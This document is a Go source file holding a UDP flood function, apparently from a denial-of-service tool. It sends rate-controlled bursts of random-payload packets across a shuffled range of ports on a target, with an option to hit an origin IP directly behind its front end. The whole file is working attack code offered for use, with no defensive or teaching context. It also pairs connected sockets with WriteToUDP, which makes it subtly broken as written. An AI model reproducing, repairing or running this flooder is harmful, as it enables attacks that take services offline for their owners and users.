package main

import (
	"log"
	"math/rand"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

func runUDPFlood(cfg *AttackConfig) {
	atomic.StoreInt32(&stopFlag, 0)
	startTime := time.Now()
	deadline := startTime.Add(time.Duration(cfg.Duration) * time.Second)

	host := cfg.Target
	port := 80
	if cfg.OriginIP != "" {
		host = cfg.OriginIP
	}

	addrs, err := net.LookupHost(host)
	if err != nil || len(addrs) == 0 {
		log.Printf("UDP flood: cannot resolve %s: %v", host, err)
		return
	}
	targetIP := addrs[0]

	payloadSize := 1024
	if cfg.RPS > 5000 {
		payloadSize = 512
	}
	payload := make([]byte, payloadSize)
	rand.Read(payload)

	var wg sync.WaitGroup
	perThreadRPS := max(1, cfg.RPS/cfg.Threads)

	portPool := make([]int, 65535-80)
	for i := range portPool {
		portPool[i] = 80 + i
	}
	rand.Shuffle(len(portPool), func(i, j int) {
		portPool[i], portPool[j] = portPool[j], portPool[i]
	})

	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			defer func() {
				if r := recover(); r != nil {
					log.Printf("UDP worker %d recovered: %v", id, r)
				}
			}()

			sock, err := net.DialUDP("udp", nil, &net.UDPAddr{
				IP:   net.ParseIP(targetIP),
				Port: port,
			})
			if err != nil {
				log.Printf("UDP worker %d: socket error: %v", id, err)
				return
			}
			defer sock.Close()

			rate := time.NewTicker(time.Second / time.Duration(perThreadRPS))
			defer rate.Stop()
			portIdx := id * 1000

			for time.Now().Before(deadline) {
				if atomic.LoadInt32(&stopFlag) == 1 {
					return
				}
				<-rate.C

				atomic.AddInt64(&metrics.TotalRequests, 1)

				targetPort := portPool[(portIdx)%len(portPool)]
				portIdx++

				_, err := sock.WriteToUDP(payload, &net.UDPAddr{
					IP:   net.ParseIP(targetIP),
					Port: targetPort,
				})
				if err != nil {
					atomic.AddInt64(&metrics.Failed, 1)
					continue
				}

				atomic.AddInt64(&metrics.Completed, 1)
			}
		}(i)
	}

	wg.Wait()
	metricsMu.Lock()
	metrics.Elapsed = time.Since(startTime).Seconds()
	metricsMu.Unlock()
}

func init() {
	rand.Seed(time.Now().UnixNano())
}
